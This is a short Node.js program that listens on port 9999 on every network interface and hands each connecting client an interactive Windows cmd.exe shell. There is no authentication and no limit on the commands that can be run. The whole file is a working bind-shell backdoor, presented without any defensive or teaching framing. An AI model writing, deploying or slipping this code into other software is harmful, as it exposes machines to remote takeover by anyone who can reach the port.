const net = require('net');
const { spawn } = require('child_process');

// Configuration
const PORT = 9999;
const HOST = '0.0.0.0';

// Create server
const server = net.createServer((socket) => {
    console.log(`Client connected: ${socket.remoteAddress}:${socket.remotePort}`);

    // Spawn a new CMD process for this client
    const cmdProcess = spawn('cmd.exe');

    // Forward data from the client to CMD
    socket.on('data', (data) => {
        const command = data.toString().trim();
        console.log(`Executing: ${command}`);
        if (command.toLowerCase() === 'exit') {
            socket.end('Goodbye!\n');
            cmdProcess.kill();
            return;
        }
        cmdProcess.stdin.write(command + '\n');
    });

    // Forward CMD output back to the client
    cmdProcess.stdout.on('data', (data) => {
        socket.write(data.toString());
    });

    cmdProcess.stderr.on('data', (data) => {
        socket.write(data.toString());
    });

    // Handle CMD process exit
    cmdProcess.on('close', () => {
        console.log(`CMD process closed for client: ${socket.remoteAddress}`);
    });

    // Handle client disconnection
    socket.on('end', () => {
        console.log(`Client disconnected: ${socket.remoteAddress}`);
        cmdProcess.kill();
    });

    // Handle socket errors
    socket.on('error', (err) => {
        console.error(`Socket error: ${err.message}`);
        cmdProcess.kill();
    });
});

// Start server
server.listen(PORT, HOST, () => {
    console.log(`Server running at ${HOST}:${PORT}`);
});
